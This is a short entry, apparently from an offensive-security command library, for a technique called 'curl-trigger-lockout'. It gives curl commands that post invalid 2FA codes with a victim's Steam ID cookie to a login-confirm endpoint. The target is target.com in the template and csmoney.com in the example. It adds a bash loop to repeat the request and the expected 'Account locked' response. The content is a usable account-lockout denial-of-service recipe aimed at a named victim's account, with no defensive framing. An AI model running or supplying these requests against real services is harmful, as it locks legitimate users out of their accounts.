---
data: >-
  curl -X POST https://target.com/login/confirm -H "Cookie:
  steamid=victim_steamid" -d '{"token":"session_token","code":"000000"}'
tags:
  - http
  - dos
  - lockout
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.319Z'
id: 85cbb440-6f6c-4109-9a81-1d037b3f3fa2
verified: false
validated: true
submitted: true
---
# curl-trigger-lockout

## Command

```bash
curl -X POST https://target.com/login/confirm -H "Cookie: steamid=victim_steamid" -d '{"token":"session_token","code":"000000"}'
```

## Description

Submits an invalid 2FA code to the modified request, repeatable to trigger rate-limit lockout.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `code` | Invalid 6-digit code in body | Yes |
| `steamid` | Victim's ID in cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://csmoney.com/login/confirm -H "Cookie: steamid=victim_id" -d '{"code":"111111"}'
```

### Advanced Usage

Loop for 4 times: Use bash for loop to repeat.

## Expected Output

After repeats: {"error":"Account locked for 5 minutes"}.

## Related

- [[commands/curl-modify-cookie]]
